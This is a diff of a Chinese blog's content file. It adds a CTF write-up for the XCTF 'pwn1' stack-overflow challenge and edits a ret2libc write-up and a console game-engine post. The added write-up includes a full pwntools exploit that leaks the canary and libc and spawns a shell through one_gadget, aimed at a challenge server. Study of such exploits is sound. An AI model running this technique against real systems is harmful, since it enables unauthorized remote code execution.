@@ -397,6 +397,27 @@
 <h1 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h1><p>有故事背景，还有多层的代码，感觉是个好玩的题，结果一看发现就是简单的栈溢出</p>
 <p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" class="lazyload" title="exp"></a></p>
 <p>非常简单，看了官方wp发现这原来是一道盲打。emmm，果然是道好题。</p>
+<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><em>因为期末导致一段时间没有做pwn了，拿这道题找找感觉</em></p>
+<p>题目描述没有过多信息，看题。</p>
+<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png" data-fancybox="group" data-caption="sec" class="fancybox"><img alt="sec" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png" class="lazyload" title="sec"></a></p>
+<p>64位。</p>
+<p>三个选项，1.储存，2.打印，3.退出</p>
+<p>看main函数</p>
+<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png" class="lazyload" title="main"></a></p>
+<p>s的大小是0x80个字节，read却可以读取0x100个字节，存在很明显的溢出。但是有canary保护所以我们首先要泄漏canary。之前利用过格式化字符串泄漏canary，这次要利用puts函数的特性来泄漏。</p>
+<p>puts函数只有遇到空字节才会停止输出，即使是0a（换行）也不会停止。canary的第一个字节是空字节，所以puts不会把canary输出，我们只要溢出覆盖掉canary的第一个字节就可以把canary泄漏出来了。</p>
+<p>s距离canary 0x88个字节，要覆盖掉canary的首位就构造一个0x89个字符的payload。</p>
+<p><code>payload=0x85*&#39;a&#39;+&#39;N0P3&#39;</code></p>
+<p>获得canary之后就可以进一步泄漏库函数地址计算offset了。</p>
+<p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</code></p>
+<p>小片段是通过ROPgadget找到的。</p>
+<p>获得offset之后就可以按照一般的ret2libc方法get shell了。但是这里对payload的长度有限制（0x100），所以用one_gadget来解。</p>
+<p>最后的payload</p>
+<p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(GetShell)</code></p>
+<p>Exp</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">res=remote(<span class="string">'220.249.52.133'</span>,<span class="number">36024</span>)</span><br><span class="line">elf=ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">payload=<span class="number">0x85</span>*<span class="string">'a'</span>+<span class="string">'N0P3'</span></span><br><span class="line">res.send(<span class="string">'1'</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">res.send(<span class="string">'2'</span>)</span><br><span class="line">canary_raw=res.recvuntil(<span class="string">'\n---'</span>)</span><br><span class="line">canary=u64(<span class="string">'\x00'</span>+canary_raw[<span class="number">137</span>:<span class="number">137</span>+<span class="number">7</span>])<span class="comment">#得到canary(canary的高位被我们覆盖了，补一个）</span></span><br><span class="line">print(<span class="string">'Get Canary!'</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#ROPgadget --binary babystack --only "pop|ret"|grep "rdi"</span></span><br><span class="line">start_addr=<span class="number">0x400720</span></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt=<span class="number">0x400690</span></span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">'a'</span>+<span class="string">'N0P3'</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">res.send(<span class="string">'1'</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line">res.recv()<span class="comment">#需要接收一次空</span></span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">res.send(<span class="string">'3'</span>)</span><br><span class="line">puts_got=u64(res.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(<span class="string">'Get Puts_Got!'</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#One_gadget </span></span><br><span class="line">shell= <span class="number">0x45216</span></span><br><span class="line">puts_libc=libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">offset=puts_got-puts_libc</span><br><span class="line">GetShell=offset+shell</span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">'a'</span>+<span class="string">'N0P3'</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(GetShell)</span><br><span class="line">res.send(<span class="string">'1'</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">res.send(<span class="string">'3'</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><em>在ida的伪代码的36行有一个sub_400826函数，是puts的再封装，无额外代码。但是这个函数却存在“失效”的现象。理论上在exp每次发送完payload后都应该接收一次空，再接收主界面字符串。但是经过测试只有第二次payload发送后才需要。具体原因未知，麻烦大佬路过解释指点一下。</em></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -464,7 +485,7 @@
 <p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.15.png" class="lazyload" title="main"></a></p>
 <p>没什么东西，去看vulnerable_function</p>
 <p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" data-fancybox="group" data-caption="vf" class="fancybox"><img alt="vf" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/level3/%E6%88%AA%E5%B1%8F2020-04-17%20%E4%B8%8A%E5%8D%8810.35.42.png" class="lazyload" title="vf"></a></p>
-<p>第6行调用了read读取了100bit，但是buf只有88bit，存在栈溢出漏洞。但是并没有system函数可以利用，而是给了libc，所以是ret2libc。我们要从libc中载入system和/bin/sh，就要先获得它们的got地址。</p>
+<p>第6行调用了read读取了0x100byte，但是buf只有0x88byte，存在栈溢出漏洞。但是并没有system函数可以利用，而是给了libc，所以是ret2libc。我们要从libc中载入system和/bin/sh，就要先获得它们的got地址。</p>
 <p><strong>攻击思路：</strong>先泄漏write函数（read函数亦可）的got地址，然后减去write函数在libc中的地址，就能得到offset（偏移），那么由于libc中的地址相对固定，就可以根据&#39;libc地址+offset=got地址&#39;算出system函数和/bin/sh的got地址。</p>
 <p>有了这两个地址，就可以当普通的栈溢出做了。</p>
 <p>完整exp如下</p>
@@ -530,18 +551,12 @@
   <entry>
     <title>在命令行上玩出花:InfantGameEngine</title>
     <url>/2020/04/05/InfantGameEngine/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大概在八年前，我第一次出现了想要做游戏的想法。认识了flash，unity，但是并没能走下去，因为教程完全看不懂，也不了解编程，但是这也是我第一次发现编程是必须要学的。</p>
-<p>在初三，我第一次认真开始学习编程，选了C++，听说它是一个程序员必须要掌握的语言。在知道什么是变量，数组，函数以及一些基本的控制语句后，我就开始了和编译器交流之旅。</p>
-<p>在编译器里写好逻辑，计算机就会执行，并在屏幕上显示出来。能显示就能做游戏，考虑到只能顺序执行，并且当时我并不知道多线程，卡牌游戏似乎最适合了。</p>
-<p>参照炉石，我一共写过两个卡牌游戏，从第一个到第二个，由于上学的缘故，这中间进步缓慢，但我也在这中间积累了一些自己封装好的函数，我写的第二个，从17年写到19年，里面有相当多的卡牌。为了实现一些卡牌效果，我会在语文课，自习课上用笔和纸写算法，那大概是我学计算机最快乐的时候。</p>
-<p>在高一的时候，我也很自然的想过写其他的游戏，想写一个像马里奥那样的横版跳跃游戏。命令行上显示的字符就是字符，我没有办法读取到命令行上某个坐标到字符，再做一些操作，我只能把它们全部储存下来。所以一开始的思路是，分成四层，每层的数据用数组储存起来，编号层，颜色层，字符层，属性层。每一帧都刷新整个屏幕，刷新的够快，就能看到连续的画面。然而，，并不行，刷新速率没有那么快。</p>
-<p>时间流转，我从高中毕业，步入大学。学长给的课程设计清单里有一个难度最高的 “七巧板”。我又想起了以前没写出的那个东西，如果我当时写出来，“七巧板”简直不存在难度。因为一些原因，最后我并没有写“七巧板”，但是这件事我还一直记着。它并不是写不出来，高一的时候我就已经想到解决办法了，只不过实在太懒，没有动手去实现。</p>
-<p>2020年，新冠疫情让我有了大把的空闲时间，我终于把它写出来了。InfantGameEngine，婴儿级游戏引擎，虽然它只能显示简单的游戏画面。但它可以支持你写非常复杂的游戏逻辑。</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>InfantGameEngine，婴儿级游戏引擎，虽然它只能显示简单的游戏画面。但它可以支持你写非常复杂的游戏逻辑。</p>
 <p>=======================================================</p>
 <p>Tip：源码已经放在github上了，建议参照源码阅读～</p>
 <p>项目地址：<a href="https://github.com/TOXICAKE/InfantGameEngine.git" target="_blank" rel="noopener">https://github.com/TOXICAKE/InfantGameEngine.git</a></p>
 <p>觉得有趣的话记得给一颗星XD</p>
-<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="储存字符"><a href="#储存字符" class="headerlink" title="储存字符"></a>储存字符</h2><p>显示在屏幕上的每一个字符都具有多个属性，所以可以用结构体来记录每一个字符。借用valve公司的hammer地图编辑器里的<strong>实体(Entity)</strong>概念，每一个字符都是Entity类的实例，称作一个实体，然后用链式结构关联每一个实体。这样只需要遍历就可以取到所有的实体，以及它们其中的数据。</p>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="储存字符"><a href="#储存字符" class="headerlink" title="储存字符"></a>储存字符</h2><p>显示在屏幕上的每一个字符都具有多个属性，所以可以用结构体来记录每一个字符。这样就引出了<strong>实体(Entity)</strong>这个概念，每一个字符都是Entity类的实例，称作一个实体，然后用链式结构关联每一个实体。这样只需要遍历就可以取到所有的实体，以及它们其中的数据。</p>
 <h2 id="刷新机制"><a href="#刷新机制" class="headerlink" title="刷新机制"></a>刷新机制</h2><p>每帧都刷新显示所有字符是不可能的，所以应该采用局部刷新的方法。假如一个实体向右移动一格，那么就是在右侧输出这个实体的字符，并在原来的位置上输出被遮挡的字符。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" data-fancybox="group" data-caption="局部刷新机制" class="fancybox"><img alt="局部刷新机制" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" class="lazyload" title="局部刷新机制"></a></p>
 <h2 id="碰撞机制"><a href="#碰撞机制" class="headerlink" title="碰撞机制"></a>碰撞机制</h2><p>实体应该具有一个参数<strong>碰撞(Collision)</strong>，两个有碰撞实体彼此不能穿过，两个实体间如果有至少一方是无碰撞的则它们彼此可以穿过。这就是基本的碰撞机制。</p>
 <p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" data-fancybox="group" data-caption="简单演示一下碰撞机制" class="fancybox"><img alt="简单演示一下碰撞机制" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" class="lazyload" title="简单演示一下碰撞机制"></a></p>
@@ -568,8 +583,8 @@
 <p>实体就是“实际”存在的意思，他具体是什么由程序员的代码来决定。例如你可以在实体类中增加一个变量Key，程序员在设计游戏时就可以给key赋值，例如1代表构成主角的实体，2代表按钮，3代表门。</p>
 <p>测试程序和测试源码都可以在github上找到。</p>
 <p>=======================================================</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>你大概不会真的动手去写一个，上面过程可能也没有很认真的思考，可能，你会觉得它没什么用。我们是直接接触框架的一代，这些东西除了作为上学时的作业，几乎毫无用处，我们上面在讨论的东西，也是之前<strong>雅达利</strong>思考过的东西，他们当时的开发环境还要更为恶劣一些。只不过如果你做一遍，你就会发现游戏引擎是如此奇妙，而这还只是做出了40年前的水平。现在的我不过只是19级的大一新生，总是在写不会有第二个人写的东西。</p>
-<p>实际上，命令行也可以做出很有趣的游戏，画面并不是游戏的唯一要素。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>你大概不会真的动手去写一个，也可能会觉得它没什么用。我们是直接接触框架的一代，这些东西除了作为上学时的作业，几乎毫无用处，我们上面在讨论的东西，也是之前<strong>雅达利</strong>思考过的东西，他们当时的开发环境还要更为恶劣一些。</p>
+<p>命令行也可以做出很有趣的游戏，画面并不是游戏的唯一要素。</p>
 <p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" data-fancybox="group" data-caption="大灾变：劫后余生" class="fancybox"><img alt="大灾变：劫后余生" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" class="lazyload" title="大灾变：劫后余生"></a></p>
 <p>当然还有著名的生命游戏。</p>
 <p>谢谢你花时间阅读这篇博客。：）</p>
